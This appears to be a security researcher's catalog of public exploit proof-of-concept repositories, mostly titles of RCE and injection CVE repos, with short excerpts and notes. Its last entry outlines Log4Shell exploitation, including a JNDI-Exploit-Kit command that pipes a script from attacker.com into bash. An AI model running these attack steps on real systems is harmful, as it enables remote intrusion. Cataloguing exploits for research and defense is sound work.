| 215 | LetsDefend SOC336: Windows OLE Zero-Click RCE Exploitation Detected | `C-G-creator_LetsDefend-SOC336-Windows-OLE-Zero-Click-RCE-Exploitation-` |
| 216 | 🚨 CVE-2025-48593 Zero-Click Remote Code Execution in Android System 🚨 | `C0D331ng_Blackash-CVE-2025-48593` |
| 217 | Python script that exploits CVE-2024-27956, a vulnerability in Wordpress that allows SQL Injection leading to Remote Code Execution. | `CERTologists_EXPLOITING-CVE-2024-27956` |
| 218 | CVE-2025-24893 - XWiki Unauthenticated Remote Code Execution | `CMassa_CVE-2025-24893` |
| 219 | CVE-2024-3400 RCE Test Script | `CONDITIONBLACK_CVE-2024-3400-POC` |
| 220 | <img width="100%" src="https://capsule-render.vercel.app/api?type=waving&height=120&color=e918d5"/> | `CVE-Hunters_CVE` |
| 221 | Cacti is an open-source network monitoring and graphing platform built on RRDtool. | `Cacti_cacti` |
| 222 | CVE-2026-5203 — CMS Made Simple ≤ 2.2.22 RCE (Path Traversal + Arbitrary File Upload) | `CaginKyr_CVE-2026-5203` |
| 223 | CVE-2026-7671 - Tornet Scooter OTP Brute Force | `CaginKyr_CVE-2026-7671` |
| 224 | CVE-2026-4480 - Samba Printing Subsystem Remote Code Execution | `CarlosEduardoPM_CVE-2026-4480-POC` |
| 225 | CVE-2025-55182 — Advanced React Server Components RCE Exploit & Assessment Framework | `CerberusMrXi_CVE-2025-55182-Advanced-React-Server-Components-RCE-Explo` |
| 226 | CVE-2026-23744 MCPJam Inspector RCE Exploit | `CerberusMrXi_CVE-2026-23744-MCPJam-Exploit` |
| 227 | Joomla SP LMS — Unauthenticated PHP Object Injection → RCE | `CerberusMrXi_CVE-2026-48909-Joomla-SP-Exploit` |
| 228 | Flowise CVE-2026-58057 - Windows Remote Code Execution Exploit | `CerberusMrXi_Flowise-CVE-2026-58057-exploit` |
| 229 | FortiWeb CVE-2025-64446 RCE Exploit | `CerberusMrXi_FortiWeb-cve-2025-64446-RCE-exploit` |
| 230 | 🔓 Krayin CRM v2.2.x - Authenticated Remote Code Execution Exploit | `CerberusMrXi_KrayinCRM-RCE-Exploit-CVE-2026-38526` |
| 231 | Langflow RCE Exploitation Framework | `CerberusMrXi_Langflow-cve-2026-33017-exploit` |
| 232 | CVE-2024-25600 — WordPress Bricks Builder Unauthenticated RCE | `CerberusMrXi_WP-Bricks-Exploit-CVE-2024-25600` |
| 233 | Keywords: CVE-2026-15409, SonicWall SMA 1000, Erlang RCE, WebSocket exploit, | `Ch4120N_CVE-2026-15409` |
| 234 | Keywords: CVE-2026-3891, Pix for WooCommerce, WordPress exploit, | `Ch4120N_CVE-2026-3891` |
| 235 | CVE-2026-55579 — Pheditor Hardcoded Default Password RCE | `Ch4120N_CVE-2026-55579` |
| 236 | CVE-2026-58138 — Conductor Unauthenticated RCE via GraalVM Evaluator | `Ch4120N_CVE-2026-58138` |
| 237 | 🛡️ CVE-2026-50522 — Microsoft SharePoint RCE Investigation | `ChPratik_CVE-2026-50522` |
| 238 | GZDoom <= 4.13.1 Arbitary Code Execution via Malicious ZScript | `Chainmanner_GZDoom-Arbitrary-Code-Execution-via-ZScript-PoC` |
| 239 | app="JETBRAINS-TeamCity" | `CharonDefalt_CVE-2024-27198-RCE` |
| 240 | CVE-2026-48939 — iCagenda Joomla Extension RCE Exploit | `ChiefYoru_CVE-2026-48939_PoC` |
| 241 | CVE-2026-56290 — Page Builder CK Joomla Mass RCE Exploit | `ChiefYoru_CVE-2026-56290_PoC` |
| 242 | CVE-2026-56291 — Balbooa Forms Joomla Mass RCE Exploit | `ChiefYoru_CVE-2026-56291_PoC` |
| 243 | Drag and Drop File Upload for Elementor Forms - Unauthenticated Arbitrary File Upload to RCE.🔥 | `ChiefYoru_Exploit-CVE-2026-18351` |
| 244 | CVE-2024-1212 Command Injection Exploit for Kemp LoadMaster 🛡️🔓 | `Chocapikk_CVE-2024-1212` |
| 245 | This repository contains a Python script designed to exploit the SSRF vulnerability (CVE-2024-21893) and command injection vulnerability (CVE-2024-21887) in Ivanti Connect Secure a | `Chocapikk_CVE-2024-21893-to-CVE-2024-21887` |
| 246 | This repository contains an exploit for the CVE-2024-29269 vulnerability, which allows unauthenticated OS command execution on TLR-2005KSH routers. This exploit leverages the vulne | `Chocapikk_CVE-2024-29269` |
| 247 | 🚀 SPIP Unauthenticated RCE Exploit | `Chocapikk_CVE-2024-7954` |
| 248 | ⚡️ Exploit for CVE-2024-8504 & CVE-2024-8503: SQLi and RCE ⚡️ | `Chocapikk_CVE-2024-8504` |
| 249 | 😈 SPIP BigUp Unauthenticated RCE Exploit 😈 | `Chocapikk_CVE-2024-8517` |
| 250 | CVE-2024-8672: Authenticated Contributor Remote Code Execution in Widget Options Plugin | `Chocapikk_CVE-2024-8672` |
| 251 | Next.js React Server Components RCE Exploit | `Chocapikk_CVE-2025-55182` |
| 252 | CVE-2025-71243 - SPIP Saisies Plugin Remote Code Execution | `Chocapikk_CVE-2025-71243` |
| 253 | openDCIM - SQLi to RCE via Config Poisoning | `Chocapikk_opendcim-exploit` |
| 254 | Penetration Testing Writeup: Next.js RCE & Node.js Inspector Privilege Escalation | `ChrisBarack_cve-2025-55182` |
| 255 | CVE-2026-53787 - Amasty Order Attributes Unauthenticated File Upload | `ChrisSEC2014_amasty-chekout-POC-rce` |
| 256 | A simple interactive Python tool that automates local port forwarding using Bore and generates ready-to-use reverse shell payloads from a JSON database. | `ChrisSEC2014_joomla-content-editor--RCE` |
| 257 | CVE-2026-32238 - Remote Code Execution in OpenEMR <8.0.0.2 | `ChrisSub08_CVE-2026-32238_RemoteCodeExecutionOpenEMR8.0.0` |
| 258 | <h1 align="center">OpenLearnX-RCE</h1> | `Christbowel_CVE-2026-41900-POC` |
| 259 | An open-source clean & customizable RAG UI for chatting with your documents. Built with both end users and | `Cinnamon_kotaemon` |
| 260 | CVE-2026-22200: osTicket Arbitrary File Read to RCE | `Clarissss_osTicketFileReadIntoRCE` |
| 261 | CVE-2026-4480 – Samba Print Job Name Command Injection | `ClearLotus-git_CVE-2026-4480-PoC` |
| 262 | CVE-2026-27626: OliveTin password-argument command injection | `Cobrastrike62_CVE-2026-27626-POC` |
| 263 | This lab exploits Craft CMS version 5.6.16, the CSV-2025-32432 has a Base Score of 10.0, and allows for remote code execution (RCE). From there and exposed MySQL passwd allows us t | `Collinformatics_HTB-Orion` |
| 264 | CVE-2025-66034-Poc-to-Get-RCE-for-HTB-VariaType | `ConradKash_exploit` |
| 265 | CVE-2024-13985 — Dahua EIMS capturehandle.action Remote Code Execution | `CrimsonfiedOfficial_CVE-2024-13985` |
| 266 | CVE-2026-44656 - Vim Modeline path Option Command Injection Vulnerability | `CryingN_CVE-2026-44656` |
| 267 | Pre-authentication remote code execution for WordPress 6.9.0–6.9.4 and 7.0.0–7.0.1. | `Crypto-Cat_wp2shell` |
| 268 | COMFAST CF-XR11 V2.7.2 has a command injection vulnerability in function sub424CB4. | `CurryRaid_iot_vul` |
| 269 | CVE-2026-23744 — MCP Connect RCE via Unauthenticated Command Injection | `CyLock11_CVE-2026-23744` |
| 270 | Windows Admin Center authenticated RCE via WinREST/PowerShell invokeCommand. | `Cyb3rWitch3r_CVE-2026-26119` |
| 271 | SmarterMail ConnectToHub RCE | `CyberAlp0_SmarterMail-CVE-2026-24423` |
| 272 | SOC274---Palo-Alto-Networks-PAN-OS-Command-Injection-Vulnerability-Exploitation-CVE-2024-3400 | `CyberBibs_SOC274---Palo-Alto-Networks-PAN-OS-Command-Injection-Vulnera` |
| 273 | CVE-2025-49113 – Roundcube 1.6.10 Authenticated Remote Code Execution | `CyberQuestor-infosec_CVE-2025-49113-Roundcube_1.6.10` |
| 274 | FortiOS and FortiProxy Password Hashing Vulnerability to RCE (CVE-2024-21754) | `CyberSecuritist_CVE-2024-21754-Forti-RCE` |
| 275 | pgAdmin4 Query Tool Authenticated RCE PoC | `Cycloctane_cve-2025-2945-poc` |
| 276 | Jellystat is a free and open source Statistics App for Jellyfin! (This project is still in development - expect some weirdness) | `CyferShepard_Jellystat` |
| 277 | EncryptInterceptor fail-open bypass in Apache Tomcat Tribes clustering leading to unauthenticated RCE via Java deserialization. | `CypherHippie_CVE-2026-34486---unauthenticated-RCE-via-Java-deserializa` |
| 278 | 🚨 CVE-2024-9264 - Grafana SQL injection leading to Remote Code Execution (RCE) and file Read | `Cythonic1_CVE-2024-9264` |
| 279 | Exploit Title: Cacti 1.2.26 - RCE (Authenticated) | `D3Ext_CVE-2024-25641` |
| 280 | Exploit Title: XWiki 15.10.10 - Unauthenticated Remote Code Execution | `D3Ext_CVE-2025-24893` |
| 281 | FortiWeb Unauthenticated RCE via Path Traversal &amp; CGI Auth Bypass | `D3crypT0r_CVE-2025-64446` |
| 282 | This repository contains a Python-based Proof of Concept (PoC) for CVE-2024-28397, a sandbox escape vulnerability in the Js2Py JavaScript interpreter for Python. | `D3ltaFormation_CVE-2024-28397-Js2Py-RCE` |
| 283 | This is a exploit for the known Remote Code Execution (RCE) vulnerability in the pymatgen (CVE-2024-23346) Python library by uploading a malicious CIF file to the hosted CIF Analyz | `DAVIDAROCA27_CVE-2024-23346-exploit` |
| 284 | This DICOM toolkit (DCMTK) package consists of source code, documentation and installation instructions for a set of software libraries and applications implementing part of the DI | `DCMTK_dcmtk` |
| 285 | CVE-2026-34197 — Apache ActiveMQ RCE vía Jolokia API | `DEVSECURITYSPRO_CVE-2026-34197` |
| 286 | CVE-2026-23744-MCPJAM-RCE-exploit | `Dahalsamir_CVE-2026-23744-MCPJAM-RCE-exploit` |
| 287 | CVE-2024-36401 — Unauthenticated RCE in GeoServer | `DanieleGiovanardi2408_cve-2024-36401-geoserver-rce` |
| 288 | Full Chain Vulnerability Testbed: Nginx RCE → GhostLock LPE | `Daniyal48_ghostlock-vagrant-box` |
| 289 | CVE-2025-55182 - React Server Components RCE POC | `Darker-Ink_react-ssr-vulnerability` |
| 290 | CVE-2025-52691 PoC: SmarterMail Arbitrary File Upload RCE (APT-Enhanced) | `DeathShotXD_CVE-2025-52691-APT-PoC` |
| 291 | Authenticated GlassFish EL Injection RCE (CVE-2026-2586) | `DeepSecurityResearch_CVE-2026-2586` |
| 292 | Pre-auth remote code execution exploit for D-Link DSR-250 and DSR-250N | `DelspoN_CVE-2024-57376` |
| 293 | CVE-2024-36401 — GeoServer OGC XPath Injection RCE | `Delt-A_CVE-2024-36401-poc` |
| 294 | A powerful exploit tool for detecting and exploiting CVE-2025-55182 vulnerability in Next.js React Server Components. This tool allows remote command execution (RCE) in vulnerable  | `Dh4v4l8_CVE-2025-55182-poc-tool` |
| 295 | CVE-2024-21413 is a critical remote code execution vulnerability in Microsoft Outlook (versions including Microsoft 365 Apps, Outlook 2016/2019, Office LTSC 2021 before February 20 | `Dhananjayasj_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vu` |
| 296 | CVE-2025-24813 - Apache Tomcat Partial PUT + Deserialization RCE | `Dhananjayasj_CVE-2025-24813-Apache-Tomcat-Partial-PUT-Deserialization-` |
| 297 | CVE-2026-34156 – NocoBase Sandbox Escape (RCE) | `Dhananjayasj_CVE-2026-34156-NocoBase-Sandbox-Escape-via-Workflow-Execu` |
| 298 | CVE-2026-3844 – Breeze Cache WordPress Plugin Unauthenticated RCE | `Dhananjayasj_CVE-2026-3844-Breeze-Cache-WordPress-Plugin-Remote-Code-E` |
| 299 | This is a proof-of-concept for [CVE-2025-21298 - Windows OLE Remote Code Execution Vulnerability (CVSS 9.8)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298).  | `Dit-Developers_CVE-2025-21298` |
| 300 | Component name ELEX WooCommerce Advanced Bulk Edit Products, Prices & Attributes | `DoTTak_CVE-2025-22352` |
| 301 | Component name WooCommerce Advanced Bulk Edit Products, Orders, Coupons, Any WordPress Post Type – Smart Manager | `DoTTak_CVE-2025-22710` |
| 302 | CVE-2025-7384 — PHP Object Injection to RCE | `Dungsocool_CVE-2025-7384` |
| 303 | CVE-2026-60137 + CVE-2026-63030 — WordPress Unauthenticated RCE | `Dungsocool_CVE-2026-60137_CVE-2026-63030` |
| 304 | Reflected XSS on Login Screen Leading to PHP Code Execution — WordPress Core | `Dungsocool_CVE-2026-64638` |
| 305 | ImageMagick Arbitrary Code Execution (CVE-2024-41817) | `Dxsk_CVE-2024-41817-poc` |
| 306 | CVE-2026-9277 - Shell-Quote Command Injection Exploit | `DylanZahedi_CVE-2026-9277` |
| 307 | CVE-2026-33017 — Langflow Unauthenticated Remote Code Execution | `Dynamo2k1_CVE-2026-33017` |
| 308 | MJML Local Code Execution PoC | `EQSTLab_CVE-2024-25293` |
| 309 | ★ CVE-2025-1302 JSONPath-plus RCE PoC ★ | `EQSTLab_CVE-2025-1302` |
| 310 | ★ CVE-2025-3248 Langflow RCE PoC ★ | `EQSTLab_CVE-2025-3248` |
| 311 | CVE-2026-16723 Fastjson RCE | `EQSTLab_CVE-2026-16723` |
| 312 | CVE-2026-25253 OpenClaw 1-Click RCE | `EQSTLab_CVE-2026-25253` |
| 313 | CVE-2026-33017 Langflow RCE | `EQSTLab_CVE-2026-33017` |
| 314 | CVE-2026-40897 Remote Code Execution in Math.js Expression Parser | `EQSTLab_CVE-2026-40897` |
| 315 | CVE-2026-60004 Gitea diffpatch RCE | `EQSTLab_CVE-2026-60004` |
| 316 | 1. You must set up the git's symbolic link option like: | `EQSTLab_git_rce` |
| 317 | EVerest is a [Linux Foundation Energy](https://lfenergy.org/) backed open-source modular | `EVerest_everest-core` |
| 318 | CVE-2026-43813 — CloudAttestation enforceEnvironment bypass | `EastArctica_CVE-2026-43813` |
| 319 | 🚨 CVE-2024-45352 – Xiaomi Smarthome Remote Code Execution (RCE) | `Edwins907_-CVE-2024-45352` |
| 320 | CVE-2024-10914 Command Injection Vulnerability Testing for D-Link NASManual testing with burpsuite | `Egi08_CVE-2024-10914` |
| 321 | This project is a simple Proof of Concept (PoC) regarding Windows Notepad vulnerability about "remote code execution". | `EleniChristopoulou_PoC-CVE-2026-20841` |
| 322 | Chromium CVE-2025-2783: Sandbox Escape & Full-Chain RCE Exploit | `ElianGonzi00_CVE-2025-2783` |
| 323 | Zero-Day Vulnerabilities in Open-Source Projects | `EmilGallajov_zero-day` |
| 324 | CVE-2025-24813 — Apache Tomcat RCE Lab | `Enzo-Tssn_PCS3844-CVE_2025_24813` |
| 325 | <source media="(prefers-color-scheme: dark)" srcset="res/banner-dark.gif"> | `EricLBuehler_mistral.rs` |
| 326 | Sitecore Critical Deserialization (RCE) CVE-2025-53690 POC and Nuclei Template | `ErikLearningSec_CVE-2025-53690-POC` |
| 327 | CVE-2024-45590 - WordPress Plugin RCE PoC | `Evillm_CVE-2024-45590-PoC` |
| 328 | CVE-2025-49113 Roundcube RCE PoC | `Evillm_CVE-2025-49113-PoC` |
| 329 | CVE-2026-4631 — Cockpit Mass Exploit Tool | `ExDev994_CVE-2026-4631-cockpit-RCE` |
| 330 | Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization | `Exploo0Osion_netcore_command_injection_2` |
| 331 | Arbitrary Command Injection Vulnerability in Netcore Routers Including NBR1005GPE, B6, and NBR200 After Authorization | `Exploo0Osion_netcore_command_injection_3` |
| 332 | Remote Code Execution – CVE-2024-28397 (pyload-ng / js2py) | `ExtremeUday_Remote-Code-Execution-CVE-2024-28397-pyload-ng-js2py-` |
| 333 | CVE-2024-27198 – JetBrains TeamCity Authentication Bypass & RCE PoC | `EynaExp_CVE-2024-27198-POC` |
| 334 | CVE-2025-55182 – Command Injection Vulnerability Scanner | `EynaExp_CVE-2025-55182-POC` |
| 335 | CVE-2026-0770: Langflow execglobals Unauthenticated Remote Code Execution (PoC) | `Ez4rd1x1_CVE-2026-0770` |
| 336 | CVE-2025-32432: Log-Poisoning to RCE Exploit Tool | `EzraMansor_CVE-2025-32432-PoC` |
| 337 | Canary Exploit for Parquet CVE-2025-30065 | `F5-Labs_parquet-canary-exploit-rce-poc-CVE-2025-30065` |
| 338 | CVE-2026-75604 - Next.js path traversal → RCE (Windows) · research lab | `FORTBRIDGE-UK_cve-2026-75604` |
| 339 | CVE-2024-21413 / Microsoft Outlook Remote Code Execution Vulnerability PoC | `FathanahHidayati_https-github.com-xaitax-CVE-2024-21413-Microsoft-Outl` |
| 340 | Blind SSRF to RCE Exploit - PrestaShop 8.1.7 | `Fckroun_CVE-2024-41651` |
| 341 | "POST /de2api/datasource/validate HTTP/1.1 | `Feng-Huang-0520_DataEase_Postgresql_JDBC_Bypass-CVE-2025-49002` |
| 342 | <source media="(prefers-color-scheme: dark)" srcset="https://github.com/FiloSottile/age/blob/main/logo/logowhite.svg"> | `FiloSottile_age` |
| 343 | CVE-2025-24893 - XWiki Unauthenticated RCE Exploit POC | `Fomovet_cve-2025-24893` |
| 344 | CVE-2024-40898 SSL Certificate Validation Bypass Scanner | `ForceEA001_CVE-2024-40898-SSL-Bypass-Detection` |
| 345 | 🚨POC RELEASED🚨PoC for SQL Injection leads to RCE in Wordpress released (CVE-2024-27956). WordPress Admin Account Creation and Reverse Shell (cve-2024-27956) | `FoxyProxys_CVE-2024-27956` |
| 346 | CVE-2026-42533 — NGINX Pre-Auth Heap Overflow: Analysis & RCE | `FranklinF25_cve-2026-42533` |
| 347 | CVE-2026-42945 — NGINX Rewrite Heap Overrun: Analysis, DoS & Credited RCE Port | `FranklinF25_cve-2026-42945` |
| 348 | MCPJam inspector Remote-Code-Execution: Proof Of Concept (POC) usage: | `FrenzisRed_CVE-2026-23744` |
| 349 | WSUS CVE-2025-59287 – XML Deserialization RCE (Reverse Shell) | `FurkanKAYAPINAR_CVE-2025-59287` |
| 350 | ModbusMechanic V3.0 Insecure Deserialization & RCE | `Gelcon_PoC-ModbusMechanic-3.0-Insecure-Deserialization-and-RCE` |
| 351 | Affected Version: <= v2.3.0(latest release version) | `Gelcon_PoC-of-Hodoku-V2.3.0-RCE` |
| 352 | Affected Software: Notepad++ versions prior to 8.8.9 using the WinGUp updater. | `George0Papasotiriou_CVE-2025-15556-Notepad-WinGUp-Updater-RCE` |
| 353 | Affected Software: PostgreSQL 15.x before 15.7, 16.x before 16.3. | `George0Papasotiriou_CVE-2025-59470-PostgreSQL-Command-Injection` |
| 354 | Affected Software: Oracle BI Publisher versions 12.2.1.4.0, 12.2.1.3.0. | `George0Papasotiriou_CVE-2025-61882-Oracle-BI-Publisher-RCE` |
| 355 | Affected Software: Gogs (self‑hosted Git service) versions prior to 0.13.0. | `George0Papasotiriou_CVE-2025-8110-Gogs-Remote-Code-Execution` |
| 356 | CVE-2026-11120 – Command Injection via Git URL in CI/CD Pipeline | `George0Papasotiriou_CVE-2026-11120-Command-Injection-via-Git-URL-in-CI` |
| 357 | CVE-2026-1337 – AI Coding Assistant Prompt Injection to RCE | `George0Papasotiriou_CVE-2026-1337-AI-Coding-Assistant-Prompt-Injection` |
| 358 | RCE PoC for Empire C2 framework &lt;5.9.3 | `ACE-Responder_Empire-C2-RCE-PoC` |
| 359 | CVE-2026-56705: Adminer < 5.4.3 — Unauthenticated RCE via MSSQL PDO DSN Injection | `Boreas37_CVE-2026-56705` |
| 360 | CVE-2024-4157: Getting Reverse Shell on Havoc C2 - Chaining SSRF with RCE | `Ch4os1_CVE-2024-4157-SSRF-RCE-Reverse-Shell` |
| 361 | CVE-2025-33053 - WebDAV Remote Code Execution (RCE) PoC & C2 Simulation | `Cyberw1ng_CVE-2025-33053-POC` |
| 362 | Disclosure for CVE-2025-63602, including a PoC for use of an insecure driver in Awesome Miner 11.2.4 leading to arbitrary kernel read/write to MSRs, resulting in kernel code execut | `D7EAD_CVE-2025-63602` |

## Corpus pass 2 (50 teknik)

- **(no-CVE)** (`Fomovet_cve-2025-24893`) — an attacker can inject groovy code into the `text` parameter, which is evaluated
- **(no-CVE)** (`Am-I-Being-Pwned_Passportal-exploit-demo`) — because the content script lives in every frame's isolated world, the exploit ju
- **(no-CVE)** (`Enderfga_claw-orchestrator`) — behind credentials this project does not hold, and a bar nobody can clear leaves
- **(no-CVE)** (`AeternaLabsHQ_pullmd`) — browser context does not touch it — so by default a request goes out claiming
- **(no-CVE)** (`14mb1v45h_cyberspace061`) — by leveraging insufficient input sanitization, this exploit allows an attacker t
- **(no-CVE)** (`Crypto-Cat_wp2shell`) — by nesting a carefully structured batch inside another batch, an attacker can:
- **(no-CVE)** (`0x0xxxx_CVE`) — command injection is possible when the ping command is executed due to insuffici
- **(no-CVE)** (`0x0xxxx_CVE`) — command injection is possible when the tracert command is executed due to insuff
- **(no-CVE)** (`0x0xxxx_CVE`) — command injection occurs when entering a value due to insufficient verification 
- **(no-CVE)** (`Asim-QAZi_Improper-Access-Control---in-P`) — cve-2026-1702 - improper access control – allows admin creation from user accoun
- **(no-CVE)** (`AlexisLafontaine1995_cve`) — cve-2026-4683 — smartcat translator for wpml ≤ 3.1.77 — missing authorization to
- **(no-CVE)** (`Caycon_cve-advisories`) — cve-2026-67621** — missing rbac middleware on document store upsert and refresh 
- **(no-CVE)** (`7etsuo_cve-2024-6387-poc`) — exploit**: remote code execution as root due to the vulnerable `sigalrm` handler
- **(no-CVE)** (`FlowiseAI_Flowise`) — flow validation** — detects empty flows, missing start nodes, disconnected nodes
- **(no-CVE)** (`CleoV2_Debuggable-App-Exploit`) — frida gadget injection** - optionally inject frida for runtime hooking via jdwp
- **(no-CVE)** (`Asim-QAZi_Improper-Access-Control-in-Sou`) — improper access control – allows unauthorized creation of users, bookings, consu
- **(no-CVE)** (`0xcc12138_wavlink-nu516u1-csrf-command-i`) — in the login logic, the `set-cookie` header does not include `samesite=strict`. 
- **(no-CVE)** (`0x0xxxx_CVE`) — insufficient validation of the input value for the domain name, which is the inp
- **(no-CVE)** (`AivarSaar_blackash-cve-2025-6389`) — it allows **unauthenticated remote code execution** — the most dangerous class o
- **(no-CVE)** (`Atreb92_cve-2024-37765`) — machform up to version 19 is affected by an authenticated blind sql injection in
- **(no-CVE)** (`Atreb92_cve-2024-37763`) — machform up to version 19 is affected by an unauthenticated stored cross-stie sc
- **(no-CVE)** (`Fomovet_cve-2025-29384`) — potential rce**: an attacker could **overwrite the return address** and execute 
- **(no-CVE)** (`EagleTube_CloudPanel`) — proof of concept (poc) for cloudpanel [improper authorization or access control 
- **(no-CVE)** (`AbdullahMaqbool22_Explosive-As-Hell-MCS-`) — react server components rce** — the server fails to sanitize user-controlled inp
- **(no-CVE)** (`Brownpanda29_Cve-2024-38063`) — scope (s)**: unchanged (u) - the exploit does not affect resources beyond the vu
- **(no-CVE)** (`Angoddess_CVE`) — scope (s):** changed (c) — the vulnerability allows privilege escalation beyond 
- **(no-CVE)** (`BlackSnufkin_BYOVD`) — standalone.** does not use `byovd-lib`. not a member of the byovd workspace — ha
- **(no-CVE)** (`A-G-U-P-T-A_wireshark-mcp`) — startup **preflight**: if tshark is missing, the process exits so your host show
- **(no-CVE)** (`Ev3rR3d_Statping_Poc`) — statping-ng v0.91.0 allows unauthorized access to sensitive api endpoints. low-p
- **(no-CVE)** (`Ev3rR3d_Statping_Poc`) — statping-ng v0.91.0 is affected by a privilege escalation vulnerability. a remot
- **(no-CVE)** (`Ev3rR3d_Statping_Poc`) — statping-ng v0.91.0 is vulnerable to account takeover. a remote attacker with a 
- **(no-CVE)** (`0x1c1ph3r_CVEs`) — successful exploitation may allow unauthorized code execution or exposure of sen
- **(no-CVE)** (`Bazskillz_WhisperPair-PoC`) — the fast pair protocol contains an **improper access control** vulnerability tha
- **(no-CVE)** (`Delphos-Labs_disclosures`) — the firmware does not stream video. the bug triggers during configuration descri
- **(no-CVE)** (`0xray5c68616e37_cve-2025-53770`) — the following poc demonstrates how an attacker can exploit the vulnerability to 
- **(no-CVE)** (`Davim09_m6plusexploit`) — the m6plus bluetooth protocol does not implement cryptographic authentication at
- **(no-CVE)** (`Davim09_m6plusexploit`) — the protocol does not implement any mechanism to ensure message uniqueness or fr
- **(no-CVE)** (`0xlyvio_cve-2026-85706-poc-exploit-gitla`) — the script cycles through all verified bypass forms (encoded segments, trailing 
- **(no-CVE)** (`FORTBRIDGE-UK_cve-2026-75604`) — the traversal spans the whole affected range, but the rce **gadget** (a react fl
- **(no-CVE)** (`570RMBR3AK3R_xwiki-cve-2025-24893-poc`) — the vulnerability arises due to improper handling of user input in the solrsearc
- **(no-CVE)** (`AbdullahMaqbool22_Explosive-As-Hell-MCS-`) — this architecture introduces a server-side execution boundary. improper input ha
- **(no-CVE)** (`Bemcliu_cve-reports`) — this improper access control ultimately leads to a privilege escalation vulnerab
- **(no-CVE)** (`Fomovet_cve-2025-24893`) — this leads to unauthenticated **remote code execution (rce)** on vulnerable xwik
- **(no-CVE)** (`Bishben_xwiki-15.10.8-reverse-shell-cve-`) — this python script exploits **cve-2025-24893**, a remote code execution vulnerab
- **(no-CVE)** (`Anonymous120386_Anonymous`) — to exploit the vulnerability, an attacker replays the wi-fi packets captured dur
- **(no-CVE)** (`Danyw24_mcp-tool-poisoning`) — tools happily leak the contents. root cause: missing path validation (cwe-22) + 
- **(no-CVE)** (`Danyw24_zyxel-p870hn-hardware-hacking`) — two phone photos of an unlabeled router board → serial console → auth bypass → r
- **(no-CVE)** (`Fomovet_cve-2026-21858`) — unauthenticated arbitrary file read → admin token forge → sandbox bypass → rce**
- **(no-CVE)** (`FPokerFace_Security-Advisory`) — under the default configuration, a remote attacker who can spoof source ip addre
- **(no-CVE)** (`0xcc12138_wavlink-nu516u1-csrf-command-i`) — wavlink wifi router — csrf authentication bypass chained with stored command inj


## Corpus deep pass (2026-10-17 — source-code mining, 13 teknik)
- `G33l0_Cve-2026-64638` — a missing plugin file makes wordpress 301 to a canonical url and then
- `G33l0_Cve-2026-64638` — a opens b (same-origin with a on the attacker origin), then navigates
- `G33l0_Cve-2026-64638` — affected: wordpress core 4.7.0 through 7.0.2 (fixed in 7.0.3 and backports)
- `G33l0_Cve-2026-64638` — full chain - host the attacker origin and wait for an admin to visit


## Corpus deep pass (correction 2026-10-17 — system-level PoC, 2 teknik)

- `4lxprime_regreSSHive` — **CVE-2024-6387 (regreSSHion)**: race condition in OpenSSH's SIGALRM handler calls async-signal-unsafe functions on glibc-based Linux, leading to **RCE as root** (pre-auth, unauthenticated). Exploit needs heap-layout + glibc-base tuning per OpenSSH version. Relevant to self-hosted appliances / VPN gateways that expose SSH in a bounty scope.
- `0xlane_xz-cve-2024-3094` — **xz/liblzma backdoor (CVE-2024-3094)**: malicious test artifacts in the release tarball extract a hidden payload during build (`IFUNC` resolver hijack in `liblzma`). Supply-chain, not remotely exploitable — audit value is *detection*: does the target build xz 5.6.0/5.6.1?


## reverse-skill field-journal (2026-10-21 — 1 kasus nyata)

- **seed-012_log4shell-jndi-rce**
  - [种子] Log4Shell（CVE-2021-44228）JNDI 注入打 RCE
  - 漏洞确认：通过任意可被记入日志的字段（User-Agent、Referer、X-Forwarded-For、登录用户名、搜索框）发探测 payload
  - 自建 LDAP 服务（marshalsec / JNDI-Exploit-Kit）
  - java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
